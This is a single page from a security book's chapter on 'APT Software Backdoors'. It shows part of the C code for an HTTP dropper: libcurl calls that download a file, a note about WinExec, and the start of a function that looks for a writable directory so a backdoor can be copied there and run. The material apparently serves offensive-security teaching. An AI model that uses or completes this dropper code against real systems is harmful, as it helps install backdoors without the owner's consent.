<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1a4" class="pf w2 h2" data-page-no="1a4"><div class="pc pc1a4 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">397</span></div><div class="t m0 x3 h44 yb3f fff fse fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);</div><div class="t m0 x3 h44 yb40 fff fse fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_WRITEDATA, outFile);</div><div class="t m0 x3 h44 yb41 fff fse fc0 sc0 ls0 ws0">    res = curl_easy_perform(curl);</div><div class="t m0 x4 hd ybbb ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou should note that the use of the W<span class="_ _2"/>inExec function is now deprecated and is </div><div class="t m0 x3 hd ybbc ff4 fs7 fc0 sc0 ls0 ws0">only provided for backw<span class="_ _0"/>ards compatibility for 16-bit <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws applications. <span class="_ _0"/>W<span class="_ _2"/>e </div><div class="t m0 x3 hd ybbd ff4 fs7 fc0 sc0 ls0 ws0">use it here to demonstrate a quick and dirty way of running an e<span class="_ _0"/>xecutable; ho<span class="_ _0"/>we<span class="_ _0"/>ver<span class="_ _2"/>, </div><div class="t m0 x3 hd ybbe ff4 fs7 fc0 sc0 ls0 ws0">we’ll use the preferred CreateProcess function in future e<span class="_ _0"/>xamples.</div><div class="t m0 x3 h7 ybbf ff1 fs3 fc0 sc0 ls0 ws0">Extended HTTP Dropper</div><div class="t m0 x3 hd ybc0 ff4 fs7 fc0 sc0 ls0 ws0">In this example, we’<span class="_ _0"/>ll extend the capabilities of the dropper to check a fe<span class="_ _0"/>w specic </div><div class="t m0 x3 hd ybc1 ff4 fs7 fc0 sc0 ls0 ws0">directories for write access and then copy the backdoor to that directory before </div><div class="t m0 x3 hd ybc2 ff4 fs7 fc0 sc0 ls0 ws0">ex<span class="_ _0"/>ecuting it. T<span class="_ _3"/>o do this, we’ll implement the ndWritableDirectory() function as </div><div class="t m0 x3 hd ybc3 ff4 fs7 fc0 sc0 ls0 ws0">sho<span class="_ _0"/>wn here:</div><div class="t m0 x3 h40 y2586 fff fs5 fc0 sc0 ls0 ws0">// Callback function to write data from CURL request</div><div class="t m0 x3 h40 y2587 fff fs5 fc0 sc0 ls0 ws0">size_t write_callback(void *buffer, size_t size, size_t nitems, void *userp);</div><div class="t m0 x3 h40 y2588 fff fs5 fc0 sc0 ls0 ws0">#define BD_FOLDERNAME "vpn"</div><div class="t m0 x3 h40 y2589 fff fs5 fc0 sc0 ls0 ws0">#define CANARY_FILE_NAME "canary.txt"</div><div class="t m0 x3 h40 y258a fff fs5 fc0 sc0 ls0 ws0">/* Function to find a directory to save backdoor to */</div><div class="t m0 x3 h40 y258b fff fs5 fc0 sc0 ls0 ws0">int findWritableDirectory( TCHAR *outTheDirectory[] );</div><div class="t m0 x3 h40 y258c fff fs5 fc0 sc0 ls0 ws0">int findWritableDirectory( TCHAR *outDirName[] )</div><div class="t m0 x3 h40 y258d fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y258e fff fs5 fc0 sc0 ls0 ws0"> int create_dir_success = NO;</div><div class="t m0 x3 h40 y258f fff fs5 fc0 sc0 ls0 ws0"> FILE *canaryFile;</div><div class="t m0 x3 h40 y2590 fff fs5 fc0 sc0 ls0 ws0"> TCHAR curDir[MAXPATH]; // used for each test</div><div class="t m0 x3 h40 y2591 fff fs5 fc0 sc0 ls0 ws0"> memset( curDir, '\0', sizeof(curDir) );</div><div class="t m0 x3 h40 y2592 fff fs5 fc0 sc0 ls0 ws0"> TCHAR canaryPath[MAXPATH]; // Store full path with canary filename</div><div class="t m0 x3 h40 y2593 fff fs5 fc0 sc0 ls0 ws0"> memset( canaryPath, '\0', sizeof(canaryPath) );</div><div class="t m0 x3 h40 y2594 fff fs5 fc0 sc0 ls0 ws0"> GetEnvironmentVariable( "LOCALAPPDATA", curDir, sizeof(curDir) );</div><div class="t m0 x3 h40 y2595 fff fs5 fc0 sc0 ls0 ws0"> /*Start by creating or identifying directory to save file</div><div class="t m0 x3 h40 y2596 fff fs5 fc0 sc0 ls0 ws0"> First is LOCALAPPDATA Environment Variable*/</div><div class="t m0 x3 h40 y2597 fff fs5 fc0 sc0 ls0 ws0"> if ( CreateDirectory( curDir ,NULL) != 0) </div><div class="t m0 x3 h40 y2598 fff fs5 fc0 sc0 ls0 ws0"> {</div><div class="t m0 x3 h40 y2599 fff fs5 fc0 sc0 ls0 ws0">  // created directory successfully</div><div class="t m0 x3 h40 y259a fff fs5 fc0 sc0 ls0 ws0">  strcat( curDir, "\\"); // add final backslash for directory</div><div class="t m0 x3 h40 y259b fff fs5 fc0 sc0 ls0 ws0">  strcat(outDirName, curDir );</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>